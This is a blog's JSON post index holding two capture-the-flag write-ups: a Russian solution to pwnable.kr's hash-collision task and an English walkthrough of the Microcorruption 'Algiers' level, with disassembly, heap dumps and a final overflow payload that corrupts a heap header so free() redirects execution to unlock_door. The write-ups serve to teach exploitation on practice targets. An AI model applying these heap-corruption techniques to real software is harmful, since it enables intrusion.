[
  
    {
      "title"    : "Hash Collision - pwnable.kr - решение",
      "category" : "",
      "tags"     : "CTF, pwnable.kr, and hash",
      "url"      : "/2023/03/13/Hash-Collision-pwnablekr/",
      "date"     : "Mar 13, 2023",
      "content"  : "решение задания collision - pwnable.krчто такое хеш-функция?  криптографическая хеш-функция (CHF ) - математический алгоритм, который отображает данные произвольных размер (часто называемый «сообщением») в битовый массив фиксированного размера («хеш-значение», «хеш» или «дайджест сообщения»1Хеш-функция берёт определённую информацию и преобразует эту информацию в строку определенной длины. Исходные данные могут быть любыми, от пароля вашего аккаунта до фильмов или книг.  Эта строка всегда будет иметь одинаковую длину вне зависимости от того, какого размера была входная информация.Есть очень важный момент:      небольшое изменение в сообщении должно изменить значение хеш-функции настолько сильно, что новое значение хеш-функции будет не коррелировать со старым хеш-значение (лавинный эффект )1  Например2:pwnable.kr - colИтак, у нас есть 3 файла, слева мы видим наши полномочия, где ‘s’ означает SUID3, то есть, мы можем запускать файл с правами владельца.давайте посмотрим содержимое файла col.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){        int* ip = (int*)p;        int i;        int res=0;        for(i=0; i&lt;5; i++){                res += ip[i];        }        return res;}int main(int argc, char* argv[]){        if(argc&lt;2){                printf("usage : %s [passcode]\n", argv[0]);                return 0;        }        if(strlen(argv[1]) != 20){                printf("passcode length should be 20 bytes\n");                return 0;        }        if(hashcode == check_password( argv[1] )){                system("/bin/cat flag");                return 0;        }        else                printf("wrong passcode.\n");        return 0;}Программа принимает в качестве аргумента строку из 20 символов. Строка предстаёт в виде 5 чисел, эти числа суммируются и их сумма проверятся со значением 0x21DD09EC.Проблема в том, что 0x21DD09EC не делится на 5. Нам нужно задать 5 чисел, сумма которых равна 0x21DD09EC.Давайте поделим 0x21DD09EC  на 5, возьмём результат без остатка, умножим на 4 и вычтем из 0x21DD09EC.итак, наша строка будет выглядеть следующим образом: 0x6c5cec8 * 4 + 0x6c5cecc.Список литературы:            https://ru.wikibrief.org/wiki/Cryptographic_hash_function &#8617; &#8617;2              https://www.kaspersky.ru/blog/the-wonders-of-hashing/3633/ &#8617;              https://ru.wikipedia.org/wiki/Suid &#8617;      ",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2023/03/13/Hash-Collision-pwnablekr/'> <img src='/media/posts_thumb/collision.png' alt='Hash Collision - pwnable.kr - решение'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>2 min read <time class='article__date' datetime='2023-03-13T00:00:30+03:00'>Mar 13, 2023</time> </span> </div><h2 class='article__title'>Hash Collision - pwnable.kr - решение</h2> <p class='article__excerpt'>CTF Writeup pwnable.kr</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Sanya'><img class='article__author-image' src='/images/15.png' alt='Sanya's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Sanya</a><span> in </span> <span class='article-tags'> <a href='/tag/CTF' class='article__tag'>CTF</a>  <a href='/tag/pwnable.kr' class='article__tag'>pwnable.kr</a>  <a href='/tag/hash' class='article__tag'>hash</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Microcorruption UAF Exploitation - Algiers",
      "category" : "",
      "tags"     : "CTF, microcorruption, and uaf",
      "url"      : "/2023/02/07/UAF-Exploitation-MicrocorruptionCTF/",
      "date"     : "Feb 7, 2023",
      "content"  : "Microcorruption - AlgiersThis level involves  Use after free(UAF)/Heap exploitationThe only thing main is doing is  calling the login function, which ends up saving its return address (0x4440) which we’ll use later on. This value is stored at 0x439a4438 &lt;main&gt;4438:  3150 9cff      add	#0xff9c, sp443c:  b012 3a46      call	#0x463a &lt;login&gt;4440 &lt;__stop_progExec__&gt;4440:  32d0 f000      bis	#0xf0, sr4444:  fd3f           jmp	#0x4440 &lt;__stop_progExec__+0x0&gt;Live Memory Dump0000:   0000 4400 0000 0000 0000 0000 0000 0000   ..D.............0010:   *0150:   0000 0000 0000 0000 0000 0000 085a 0000   .............Z..0160:   *2400:   0824 0010 0100 0000 0000 0000 0000 0000   .$..............2410:   *4390:   0000 0000 0000 0000 0000 4044 0000 0000   ..........@D....                                  ^The login function looks like this:463a &lt;login&gt;463a:  0b12           push	r11463c:  0a12           push	r10463e:  3f40 1000      mov	#0x10, r154642:  b012 6444      call	#0x4464 &lt;malloc&gt;4646:  0a4f           mov	r15, r104648:  3f40 1000      mov	#0x10, r15464c:  b012 6444      call	#0x4464 &lt;malloc&gt;4650:  0b4f           mov	r15, r114652:  3f40 9a45      mov	#0x459a, r154656:  b012 1a47      call	#0x471a &lt;puts&gt;465a:  3f40 c845      mov	#0x45c8, r15465e:  b012 1a47      call	#0x471a &lt;puts&gt;4662:  3e40 3000      mov	#0x30, r144666:  0f4a           mov	r10, r154668:  b012 0a47      call	#0x470a &lt;getsn&gt;466c:  3f40 c845      mov	#0x45c8, r154670:  b012 1a47      call	#0x471a &lt;puts&gt;4674:  3f40 d445      mov	#0x45d4, r154678:  b012 1a47      call	#0x471a &lt;puts&gt;467c:  3e40 3000      mov	#0x30, r144680:  0f4b           mov	r11, r154682:  b012 0a47      call	#0x470a &lt;getsn&gt;4686:  0f4b           mov	r11, r154688:  b012 7045      call	#0x4570 &lt;test_password_valid&gt;468c:  0f93           tst	r15468e:  0524           jz	#0x469a &lt;login+0x60&gt;4690:  b012 6445      call	#0x4564 &lt;unlock_door&gt;4694:  3f40 0b46      mov	#0x460b, r154698:  023c           jmp	#0x469e &lt;login+0x64&gt;469a:  3f40 1b46      mov	#0x461b, r15469e:  b012 1a47      call	#0x471a &lt;puts&gt;46a2:  0f4b           mov	r11, r1546a4:  b012 0845      call	#0x4508 &lt;free&gt;46a8:  0f4a           mov	r10, r1546aa:  b012 0845      call	#0x4508 &lt;free&gt;46ae:  3a41           pop	r1046b0:  3b41           pop	r1146b2:  3041           retWe can see that it’s malloc’ing 0x10 bytes but gets’ing 0x30 bytes, so what can we do with this? The first thing we should try is to corrupt the heap structure somehow, but first we need to take a look at how it’s implemented.The program  also tells us that both the username and password must be between 8 and 16 characters each. So let’s try the following:  username: AAAAAAAA  password:  BBBBBBBBAfter entering these values we can take a look at the memory dump:Live Memory Dump2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA2410:   4141 4141 4141 0000 0000 0000 0000 0824   AAAAAA.........$                                  prev chunk ^ 2420:   3424 2100 4242 4242 4242 4242 0000 0000   4$!.BBBBBBBB....2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........So it seems that the heap starts at 2408 and it uses a 6 byte header made of:  2 bytes for the address of the previous chunk  2 bytes for the address of next chunk  2 bytes for the size of the chunk  the third field of the header where we save the size of the chunk is actually saving the value of: 2 * sizeof the chunk + the last bit set to indicate that the chunk is being used  So in this case since we used malloc(0x10) the total size is 0x20 + 0x1 = 0x21  Same thing happens for the second chunk, size is stored at 2422Here we have 2 chunks, one for the username and other for passwordSo at 2408 we see that value 2408(stored as 0824 due to the  endianness) meaning the previous chunk is 2408 itself as this is the first chunk of the heapThen, at 240a we have the value 241e which shows us the start of the next chunk containing the password buffer made of the 42’s (B’s) that we typed earlier.To summarize:  We have two chunks in the heap, starting at 2408  each chunk is made of a 6-byte header containing the address of the previous chunk, the address of the next chunk and its size  in this case each chunk contains the 6 byte header plus 0x10 bytes for the buffer allocated with malloc(0x10)We can already see that malloc(0x10) is actually using more bytes than just 0x10.The second chunk (the one with the supplied password) starts at 241e right after the username buffer.Our goal is to overflow the heap header of the second chunk starting at 0x241e with a username larger than 0x10 so that when free() kicks in it will overwrite an address with a value of our choiceSo we use the username buffer of the first chunk to overflow the second chunk header so that we can have a ‘write what to where’ condition.The free function:508 &lt;free&gt;4508:  0b12           push	r11450a:  3f50 faff      add	#0xfffa, r15450e:  1d4f 0400      mov	0x4(r15), r134512:  3df0 feff      and	#0xfffe, r134516:  8f4d 0400      mov	r13, 0x4(r15)451a:  2e4f           mov	@r15, r14451c:  1c4e 0400      mov	0x4(r14), r124520:  1cb3           bit	#0x1, r124522:  0d20           jnz	#0x453e &lt;free+0x36&gt;4524:  3c50 0600      add	#0x6, r124528:  0c5d           add	r13, r12452a:  8e4c 0400      mov	r12, 0x4(r14)452e:  9e4f 0200 0200 mov	0x2(r15), 0x2(r14)4534:  1d4f 0200      mov	0x2(r15), r134538:  8d4e 0000      mov	r14, 0x0(r13)453c:  2f4f           mov	@r15, r15453e:  1e4f 0200      mov	0x2(r15), r144542:  1d4e 0400      mov	0x4(r14), r134546:  1db3           bit	#0x1, r134548:  0b20           jnz	#0x4560 &lt;free+0x58&gt;454a:  1d5f 0400      add	0x4(r15), r13454e:  3d50 0600      add	#0x6, r134552:  8f4d 0400      mov	r13, 0x4(r15)4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)455c:  8e4f 0000      mov	r15, 0x0(r14)4560:  3b41           pop	r114562:  3041           retExploiting the heapSo let’s try using a username long enough to overflow the second chunk’s header:  Username: A * 16 + BB + CC + DD  Password: doesn’t really matter, I’ll just use 0x4949This gives that following memory dumpLive Memory Dump0000:   0000 4400 0000 0000 0000 0000 0000 0000   ..D.............0010:   3041 0000 0000 0000 0000 0000 0000 0000   0A..............0020:   *0150:   0000 0000 0000 0000 0000 0000 085a 0000   .............Z..0160:   *2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA2410:   4141 4141 4141 4141 4141 4141 4141 4242   AAAAAAAAAAAAAABB2420:   4343 4444 4949 0000 0000 0000 0000 0000   CCDDII..........2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........So the 6-byte header of the second chunk is overwritten with BBCCDD, stepping through the first lines of the free function, we see that a value is written to BB+4.Well, we want to overwrite main’s return address which is at 439a, so we should set BB to be 439a - 4 = 4396.So whenever BB = 0x4396 free() will overwrite main’s return address with a particular value.So far we have:  Username = A*16 + 0x4396 + CC + DDNow how do we figure out the values of CC and DD so that we can successfully change the flow of execution so that main() returns to an address of our choice?If you look closely at free(), the value at our target address 0x439a is 4440(this is where main will return to) is being added to 6 and to DD.So basically main’s return value is overwritten with:0x4440 (which it its original value) + 0x6 + DDWe need this sum to be equal to the address of the unlock_door function at 4564, so we can solve for DD:0x4440  + 0x6 + DD = 4564DD = 0x11eUpdating our username, now we have:  Username = A * 16 + 0x4396 + CC + 0x11eNote:If just use this username as it is, it will overwrite our target value with the address of the unlock_door function. This happens at452a:  8e4c 0400      mov	r12, 0x4(r14)where r12 contains the result of our sum, and 0x4(r14) is our BB+4, namely 439a which contains the value of the return address of main.However, you will get a load address unaligned: 4343 warning due to the following line:4538:  8d4e 0000      mov	r14, 0x0(r13)at this point r14 = 4396 (i.e 439a - 4), and r13 = 4343 which is CC.So CC is not a valid address for this. What value can we choose?Let’s take a look at the memory dump again:Live Memory Dump2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA2410:   4141 4141 4141 4141 4141 4141 4141 9643   AAAAAAAAAAAAAA.C2420:   4343 1e01 4949 0000 0000 0000 0000 0000   CC..II..........2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........2440:   *4380:   0000 0000 ca46 0100 ca46 0300 3e47 0000   .....F...F..&gt;G..4390:   0a00 2424 a846 0000 4343 6445 0000 0000   ..$$.F..CCdE....43a0:   *4400:   3140 0044 1542 5c01 75f3 35d0 085a 3f40   1@.D.B\.u.5..Z?@4410:   0600 0f93 0724 8245 5c01 2f83 9f4f 4847   .....$.E\./..OHG4420:   0024 f923 3f40 0000 0f93 0624 8245 5c0From what I tested both  4410 and 4420  are valid values for CC.Now we just put the pieces togetherSolution  Username: A * 16 + 0x4396 + 4420 + 0x11e  Username = 41414141414141414141414141414141964320441e01or  Username = 41414141414141414141414141414141964310441e01",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2023/02/07/UAF-Exploitation-MicrocorruptionCTF/'> <img src='/media/posts_thumb/uaf.png' alt='Microcorruption UAF Exploitation - Algiers'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>8 min read <time class='article__date' datetime='2023-02-07T00:00:30+03:00'>Feb 7, 2023</time> </span> </div><h2 class='article__title'>Microcorruption UAF Exploitation - Algiers</h2> <p class='article__excerpt'>CTF Writeup</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Sanya'><img class='article__author-image' src='/images/15.png' alt='Sanya's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Sanya</a><span> in </span> <span class='article-tags'> <a href='/tag/CTF' class='article__tag'>CTF</a>  <a href='/tag/microcorruption' class='article__tag'>microcorruption</a>  <a href='/tag/uaf' class='article__tag'>uaf</a> </span></div></div></div></div></div>"
    } 
  
]
